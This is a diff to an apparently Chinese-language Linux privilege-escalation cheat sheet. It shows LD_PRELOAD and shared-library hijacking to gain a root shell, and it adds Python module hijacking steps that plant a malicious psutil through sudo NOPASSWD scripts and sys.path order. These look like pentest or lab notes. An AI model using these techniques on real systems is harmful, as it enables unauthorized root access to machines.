@@ -243,7 +243,6 @@ gcc -fPIC -shared -o root.so root.c -nostartfiles            把 root.c 编译�
 sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart            获得 root shell
 
 
-
 readelf -d payroll  | grep PATH                                   查看库路径  /development
 ldd payroll                                                       查看 payroll 依赖动态库 libshared.so
 cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so      用空文件覆盖 /development/libshared.so
@@ -263,3 +262,33 @@ gcc src.c -fPIC -shared -o /development/libshared.so              编译恶意�
   } 
   ————————————
 ./payroll         获得 root shell
+
+
+sudo -l      查看 NOPASSWD 的 ./mem_status.py
+查看能不能直接写入
+不行，查看能够不能写入 ./mem_status.py 里 import 的 module，psutil
+把以下内容插入对应 module 头部
+  ————————————
+      #### Hijacking
+    import os
+    os.system('id')
+  ————————————
+sudo /usr/bin/python3 ./mem_status.py            查看 id
+
+
+python3 -c 'import sys; print("\n".join(sys.path))'            查看 python3 依赖优先顺序
+pip3 show psutil                                               查看 psutil 路径
+
+在靠前的可写目录创建恶意 psutil.py
+  psutil.py 内容
+  ————————————
+  #!/usr/bin/env python3
+
+  import os
+  
+  def virtual_memory():
+      os.system('id')
+  ————————————
+sudo /usr/bin/python3 ./mem_status.py            查看 id
+
+
